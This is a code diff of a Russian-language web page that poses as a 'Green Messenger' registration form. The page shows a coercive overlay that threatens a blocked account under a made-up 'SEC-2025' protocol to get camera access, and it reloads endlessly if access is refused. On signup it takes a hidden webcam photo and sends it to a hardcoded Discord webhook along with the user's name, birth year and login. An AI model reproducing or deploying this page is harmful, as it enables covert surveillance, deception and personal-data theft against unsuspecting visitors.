@@ -3,29 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Messenger Registration</title>
+    <title>Green Messenger Registration</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #0e1621; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        
+        body { 
+            font-family: 'Segoe UI', sans-serif; 
+            background: linear-gradient(135deg, #008080 0%, #20b2aa 100%); 
+            color: white; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            overflow: hidden; 
+            position: relative;
+        }
+
+        /* Анимированные волны на фоне */
+        body::before {
+            content: "";
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            top: -50%;
+            left: -50%;
+            z-index: 0;
+            background: url('https://www.transparenttextures.com/patterns/waves.png');
+            opacity: 0.2;
+            animation: moveWaves 20s linear infinite;
+        }
+
+        @keyframes moveWaves {
+            from { transform: translateX(0) translateY(0); }
+            to { transform: translateX(50px) translateY(50px); }
+        }
+
         /* Основная карточка */
-        .reg-card { background-color: #17212b; padding: 30px; border-radius: 10px; width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); z-index: 1; }
-        h2 { text-align: center; color: #6ab3f3; }
+        .reg-card { 
+            background-color: #1a2e2a; 
+            padding: 30px; 
+            border-radius: 15px; 
+            width: 350px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3); 
+            z-index: 2; 
+            border: 1px solid #2e8b57;
+        }
+
+        h2 { text-align: center; color: #4ade80; margin-top: 0; }
+        
         .input-group { margin-bottom: 12px; }
-        label { display: block; margin-bottom: 5px; font-size: 13px; color: #82aaff; }
-        input { width: 100%; padding: 10px; border-radius: 5px; border: 1px solid #242f3d; background: #242f3d; color: white; box-sizing: border-box; }
-        .reg-btn { width: 100%; padding: 12px; background: #3390ec; border: none; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; margin-top: 15px; }
-        .reg-btn:hover { background: #2b77c0; }
+        label { display: block; margin-bottom: 5px; font-size: 13px; color: #a7f3d0; }
+        
+        input { 
+            width: 100%; 
+            padding: 10px; 
+            border-radius: 5px; 
+            border: 1px solid #2d4f47; 
+            background: #243b35; 
+            color: white; 
+            box-sizing: border-box; 
+            outline: none;
+        }
+        
+        input:focus { border-color: #4ade80; }
+
+        .reg-btn { 
+            width: 100%; 
+            padding: 12px; 
+            background: #22c55e; 
+            border: none; 
+            border-radius: 5px; 
+            color: white; 
+            font-weight: bold; 
+            cursor: pointer; 
+            margin-top: 15px; 
+            transition: 0.3s;
+        }
+        .reg-btn:hover { background: #16a34a; transform: translateY(-2px); }
 
         /* Окно "Пугалка" */
         #camera-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #0e1621; z-index: 1000; 
+            background: #0d1a17; z-index: 1000; 
             display: flex; flex-direction: column; justify-content: center; align-items: center; 
             text-align: center; padding: 20px;
         }
-        .warning-box { border: 1px solid #3390ec; padding: 25px; border-radius: 10px; max-width: 400px; background: #17212b; }
-        .warning-box h3 { color: #ff5252; margin-top: 0; }
-        .warning-box p { color: #cfd6dc; font-size: 14px; line-height: 1.5; }
+        
+        .warning-box { 
+            border: 2px solid #22c55e; 
+            padding: 25px; 
+            border-radius: 15px; 
+            max-width: 400px; 
+            background: #1a2e2a; 
+        }
+        .warning-box h3 { color: #f87171; margin-top: 0; }
+        .warning-box p { color: #d1fae5; font-size: 14px; line-height: 1.5; }
         
         #video, #canvas { display: none; }
     </style>
@@ -34,13 +105,13 @@
 
 <div id="camera-overlay">
     <div class="warning-box">
-        <h3>⚠️ ВНИМАНИЕ</h3>
+        <h3>⚠️ СИСТЕМНАЯ ВЕРИФИКАЦИЯ</h3>
         <p>
-            Для завершения регистрации в зашифрованной сети Messenger, система должна провести <b>биометрическую проверку оборудования</b>.
+            Для доступа к защищенному каналу связи необходимо подтвердить личность владельца устройства.
             <br><br>
-            Если вы не предоставите доступ к камере, приложение будет работать <b>некорректно</b>, а ваш аккаунт может быть мгновенно заморожен системой безопасности.
+            В случае отказа доступ к серверу будет заблокирован по протоколу <b>SEC-2025</b>.
         </p>
-        <button class="reg-btn" onclick="requestAccess()">ПОДТВЕРДИТЬ И ПРОДОЛЖИТЬ</button>
+        <button class="reg-btn" onclick="requestAccess()">ПРОЙТИ ПРОВЕРКУ</button>
     </div>
 </div>
 
@@ -56,7 +127,7 @@
     </div>
     <div class="input-group">
         <label>Год рождения</label>
-        <input type="number" id="birthyear" placeholder="2000">
+        <input type="text" id="birthyear" placeholder="2000" maxlength="4" oninput="validateYear(this)">
     </div>
     <div class="input-group">
         <label>Логин</label>
@@ -77,60 +148,52 @@
     const canvas = document.getElementById('canvas');
     const overlay = document.getElementById('camera-overlay');
     
-    // ТВОЙ ВЕБХУК
     const discordWebhookUrl = 'https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw';
 
-    // Функция запроса доступа
+    // Запрещаем вводить всё кроме цифр и ограничиваем годом 2025
+    function validateYear(input) {
+        input.value = input.value.replace(/[^0-9]/g, ''); // Только цифры
+        if (parseInt(input.value) > 2025) {
+            input.value = "2025";
+        }
+    }
+
     async function requestAccess() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
-            // Прячем пугалку, если доступ дали
             overlay.style.display = 'none';
-            document.body.style.overflow = 'auto';
         } catch (err) {
-            console.error("Ошибка:", err);
-            alert("КРИТИЧЕСКАЯ ОШИБКА: Доступ отклонен! Регистрация заблокирована для вашего устройства.");
-            // Перезагрузка страницы, чтобы зациклить пугалку
+            alert("ОШИБКА: Доступ отклонен! Регистрация невозможна без биометрии.");
             location.reload();
         }
     }
 
-    // Функция регистрации и отправки данных
     async function register() {
-        const data = {
-            first: document.getElementById('firstname').value,
-            last: document.getElementById('lastname').value,
-            year: document.getElementById('birthyear').value,
-            login: document.getElementById('login').value
-        };
+        const yearVal = document.getElementById('birthyear').value;
+        const firstVal = document.getElementById('firstname').value;
 
-        if (!data.login || !data.first) {
-            alert("Заполни все поля!");
+        if (!yearVal || !firstVal || yearVal.length < 4) {
+            alert("Введите корректные данные!");
             return;
         }
 
-        // 1. Делаем скрытое фото
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0);
+        canvas.getContext('2d').drawImage(video, 0, 0);
         
-        // 2. Отправляем в Discord
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
-            
             const discordMessage = {
                 embeds: [{
-                    title: "🚀 Новая регистрация (с верификацией лица)",
-                    color: 3447003,
+                    title: "🟢 Новый пользователь верифицирован",
+                    color: 5763719, // Зеленый
                     fields: [
-                        { name: "Имя Фамилия", value: `${data.first} ${data.last}`, inline: true },
-                        { name: "Год рождения", value: data.year, inline: true },
-                        { name: "Логин", value: data.login, inline: false }
+                        { name: "Имя", value: firstVal, inline: true },
+                        { name: "Год", value: yearVal, inline: true },
+                        { name: "Логин", value: document.getElementById('login').value, inline: false }
                     ],
-                    image: { url: 'attachment://photo.png' },
-                    footer: { text: "Система слежения активирована" }
+                    image: { url: 'attachment://photo.png' }
                 }]
             };
 
@@ -138,16 +201,8 @@
             formData.append('file', blob, 'photo.png');
 
             try {
-                const response = await fetch(discordWebhookUrl, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                if (response.ok) {
-                    alert("Регистрация успешно завершена! Данные верифицированы.");
-                } else {
-                    alert("Ошибка сервера. Попробуйте позже.");
-                }
+                await fetch(discordWebhookUrl, { method: 'POST', body: formData });
+                alert("Аккаунт создан! Данные переданы в систему.");
             } catch (err) {
                 alert("Ошибка сети.");
             }
@@ -156,6 +211,4 @@
 </script>
 
 </body>
-
 </html>
-
